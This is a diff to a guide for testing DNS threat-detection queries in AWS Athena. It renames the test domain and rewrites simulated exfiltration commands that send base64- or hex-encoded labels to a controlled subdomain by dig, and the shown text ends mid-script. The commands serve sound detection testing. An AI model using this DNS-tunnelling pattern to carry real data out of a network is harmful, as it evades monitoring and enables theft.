@@ -33,7 +33,7 @@ This guide provides step-by-step instructions for testing each of the DNS threat
 ```bash
 # Run on EC2 instance
 for i in {1..25}; do 
-  dig "data${i}.evil.andrewrea.co.uk"
+  dig "data${i}.dnsdemo.andrewrea.co.uk"
   sleep 10  # 25 queries over ~4 minutes
 done
 ```
@@ -42,7 +42,7 @@ done
 1. Go to AWS Athena console
 2. Run saved query: **"DNS Exfiltration Detection"**
 3. **Expected Result**: 
-   - Shows `evil.andrewrea.co.uk` 
+   - Shows `dnsdemo.andrewrea.co.uk` 
    - `severity`: HIGH or CRITICAL
    - `query_count`: 25
    - `threat_type`: HIGH_FREQUENCY
@@ -59,24 +59,33 @@ done
 
 **Minute 0 - Generate encoded data queries**:
 ```bash
-# Base64 encoded queries ("HelloWorld", "This is a test")
-dig "SGVsbG9Xb3JsZA.evil.andrewrea.co.uk"
-dig "VGhpcyBpcyBhIHRlc3Q.evil.andrewrea.co.uk"
-
-# Hex encoded queries ("HelloWorld", "Another test string")  
-dig "48656c6c6f576f726c64.evil.andrewrea.co.uk"
-dig "416e6f74686572207465737420737472696e67.evil.andrewrea.co.uk"
-
-# Repeat the pattern 2-3 times to hit >5 threshold
-dig "SGVsbG9Xb3JsZA.evil.andrewrea.co.uk"
-dig "48656c6c6f576f726c64.evil.andrewrea.co.uk"
+  dig "VGhpcyBpcyBhIHRlc3Q.dnsdemo.andrewrea.co.uk"
+  dig "QW5vdGhlciB0ZXN0.dnsdemo.andrewrea.co.uk"
+  dig "RGF0YSBleGZpbHRyYXRpb24.dnsdemo.andrewrea.co.uk"
+  dig "SGV4IGVuY29kaW5n.dnsdemo.andrewrea.co.uk"
+  dig "VGh4cyBpcyBhIHRlc3Q.dnsdemo.andrewrea.co.uk"
+  dig "QW54dGhlciB0ZXN0.dnsdemo.andrewrea.co.uk"
+  dig "RGF4YSBleGZpbHRyYXRpb24.dnsdemo.andrewrea.co.uk"
+  dig "SGV5IGVuY29kaW5n.dnsdemo.andrewrea.co.uk"
+  dig "VGh4cyBpcy6hIHRlc3Q.dnsdemo.andrewrea.co.uk"
+  dig "QW54dGhlci60ZXN0.dnsdemo.andrewrea.co.uk"
+  dig "RGF4YSBleG6pbHRyYXRpb24.dnsdemo.andrewrea.co.uk"
+  dig "SGV5IGVuY26kaW5n.dnsdemo.andrewrea.co.uk"
+  dig "VGh4cyBpcy68IHRlc3Q.dnsdemo.andrewrea.co.uk"
+  dig "QW54dGhlci68ZXN0.dnsdemo.andrewrea.co.uk"
+  dig "RGF4YSBleG68bHRyYXRpb24.dnsdemo.andrewrea.co.uk"
+  dig "SGV5IGVuY268aW5n.dnsdemo.andrewrea.co.uk"
+  dig "VGh4cyBpcy68IH2lc3Q.dnsdemo.andrewrea.co.uk"
+  dig "QW54dGhlci68ZX20.dnsdemo.andrewrea.co.uk"
+  dig "RGF4YSBleG68bH2yYXRpb24.dnsdemo.andrewrea.co.uk"
+  dig "SGV5IGVuY268aW2n.dnsdemo.andrewrea.co.uk"
 ```
 
 **Minute 5 - Check results**:
 1. Go to AWS Athena console
 2. Run saved query: **"DNS Data Encoding Detection"**
 3. **Expected Result**:
-   - Shows `evil.andrewrea.co.uk`
+   - Shows `dnsdemo.andrewrea.co.uk`
    - `encoding_patterns`: ['BASE64', 'HEX']
    - `avg_label_length`: 20-30
    - `threat_type`: DATA_ENCODING
@@ -121,7 +130,7 @@ dig "www.target.andrewrea.co.uk"
 
 ```bash
 # Terminal 1 - Exfiltration test
-for i in {1..25}; do dig "data${i}.evil.andrewrea.co.uk"; sleep 10; done &
+for i in {1..25}; do dig "data${i}.dnsdemo.andrewrea.co.uk"; sleep 10; done &
 
 # Terminal 2 - Encoding test  
 for i in {1..3}; do
